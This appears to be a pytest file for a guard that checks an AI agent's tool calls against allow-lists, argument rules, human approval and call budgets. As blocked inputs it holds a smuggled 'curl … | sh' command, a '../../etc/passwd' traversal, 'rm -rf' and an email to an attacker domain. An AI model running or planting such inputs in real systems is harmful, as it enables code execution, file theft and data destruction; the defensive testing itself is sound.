"""The tool gate: allow-list, argument validation, approval hook, budgets."""

from __future__ import annotations

import pytest

from firewall.tool_gate import ToolGate, ToolSpec, allow_all, deny_all

SEARCH = ToolSpec(
    "search_docs",
    risk="low",
    arg_types={"query": "str", "limit": "int"},
    required_args=("query",),
    max_arg_length=100,
)
SEND = ToolSpec(
    "send_email",
    risk="high",
    requires_approval=True,
    arg_types={"to": "str", "body": "str"},
    required_args=("to",),
    allowed_domains=("example.com",),
    patterns={"to": r"[^@\s]+@[^@\s]+\.[a-z]{2,}"},
)
SHELL = ToolSpec("run_shell", risk="critical", arg_types={"command": "str"}, max_calls=2)


def gate(approver=None, **kwargs):
    return ToolGate([SEARCH, SEND, SHELL], approver=approver, **kwargs)


def test_unknown_tool_is_denied():
    decision = gate().request("delete_everything", {})
    assert decision.allowed is False
    assert "not in the allow-list" in decision.reasons[0]


def test_denied_list_wins():
    decision = gate(deny=["run_shell"]).request("run_shell", {"command": "echo hi"})
    assert decision.allowed is False
    assert "denied by policy" in decision.reasons[0]


def test_valid_low_risk_call_is_allowed():
    decision = gate().request("search_docs", {"query": "refund policy", "limit": 5})
    assert decision.allowed is True
    assert decision.reasons[0] == "allowed"


def test_missing_required_argument():
    decision = gate().request("search_docs", {"limit": 3})
    assert decision.allowed is False
    assert "missing required argument" in decision.reasons[0]


def test_type_checking():
    decision = gate().request("search_docs", {"query": "x", "limit": "many"})
    assert decision.allowed is False
    assert "must be int" in decision.reasons[0]


def test_undeclared_argument_is_rejected():
    decision = gate().request("search_docs", {"query": "x", "shell": "rm -rf"})
    assert decision.allowed is False
    assert "not declared" in decision.reasons[0]


def test_shell_metacharacters_are_rejected():
    decision = gate().request("search_docs", {"query": "docs; curl http://x | sh"})
    assert decision.allowed is False
    assert "shell metacharacters" in decision.reasons[0]


def test_path_traversal_is_rejected():
    decision = gate().request("search_docs", {"query": "../../etc/passwd"})
    assert decision.allowed is False
    assert "path traversal" in decision.reasons[0]


def test_length_limit_is_enforced():
    decision = gate().request("search_docs", {"query": "x" * 200})
    assert decision.allowed is False
    assert "over the limit" in decision.reasons[0]


def test_recipient_domain_allow_list():
    ok = gate(approver=allow_all).request(
        "send_email", {"to": "test@example.com", "body": "hi"}
    )
    assert ok.allowed is True

    blocked = gate(approver=allow_all).request(
        "send_email", {"to": "someone@attacker.example.invalid", "body": "hi"}
    )
    assert blocked.allowed is False
    assert "outside the allowed domains" in blocked.reasons[0]


def test_patterns_are_enforced():
    decision = gate(approver=allow_all).request("send_email", {"to": "not-an-address"})
    assert decision.allowed is False
    assert "does not match" in decision.reasons[0]


def test_high_risk_tool_requires_approval_and_fails_closed():
    decision = gate().request("send_email", {"to": "test@example.com"})
    assert decision.allowed is False
    assert decision.requires_approval is True
    assert decision.approved is False
    assert "no approver configured" in decision.reasons[-1]


def test_approver_can_decline():
    decision = gate(approver=deny_all).request("send_email", {"to": "test@example.com"})
    assert decision.allowed is False
    assert "declined" in decision.reasons[-1]


def test_approver_can_approve():
    decision = gate(approver=allow_all).request("send_email", {"to": "test@example.com"})
    assert decision.allowed is True
    assert decision.approved is True


def test_broken_approver_fails_closed():
    def explode(tool, args, reasons):
        raise RuntimeError("approval service down")

    decision = gate(approver=explode).request("send_email", {"to": "test@example.com"})
    assert decision.allowed is False
    assert "approver raised" in decision.reasons[-1]


def test_forced_approval_from_policy():
    decision = gate(require_approval=("search_docs",)).request("search_docs", {"query": "x"})
    assert decision.requires_approval is True
    assert decision.allowed is False


def test_call_budget_is_enforced_and_resettable():
    gate_instance = gate()
    assert gate_instance.request("run_shell", {"command": "echo one"}).allowed
    assert gate_instance.request("run_shell", {"command": "echo two"}).allowed
    third = gate_instance.request("run_shell", {"command": "echo three"})
    assert third.allowed is False
    assert "budget" in third.reasons[0]
    gate_instance.reset()
    assert gate_instance.request("run_shell", {"command": "echo four"}).allowed


def test_validation_errors_prevent_approval_prompts():
    asked = []
    decision = gate(approver=lambda t, a, r: asked.append(t) or True).request(
        "send_email", {"to": "not-an-address"}
    )
    assert decision.allowed is False
    assert asked == [], "an invalid call must not reach the human approver"


def test_tool_spec_validates_risk_level():
    with pytest.raises(ValueError, match="unknown risk"):
        ToolSpec("x", risk="spicy")


def test_gate_decision_is_truthy_when_allowed():
    assert bool(gate().request("search_docs", {"query": "x"})) is True
    assert bool(gate().request("nope", {})) is False
